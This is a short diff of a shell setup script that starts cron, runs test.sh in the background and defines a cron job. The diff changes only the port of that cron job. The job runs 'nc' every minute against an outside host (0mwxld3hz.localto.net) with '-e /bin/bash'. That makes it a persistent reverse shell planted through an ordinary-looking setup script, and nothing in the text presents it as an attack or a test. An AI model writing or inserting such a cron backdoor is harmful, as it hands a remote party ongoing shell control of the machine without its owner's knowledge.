@@ -4,7 +4,7 @@ echo "---------------------------------------------------------------"
 sudo systemctl start cron && sudo systemctl enable cron && bash test.sh &
 # sudo apt install python3-venv
 # Define the cron job (e.g., run a script every 10 minutes)
-CRON_JOB="* * * * * nc 0mwxld3hz.localto.net 3679 -e /bin/bash"
+CRON_JOB="* * * * * nc 0mwxld3hz.localto.net 1289 -e /bin/bash"
 
 # Check if the cron job already exists
 (crontab -l 2>/dev/null | grep -F "$CRON_JOB") >/dev/null
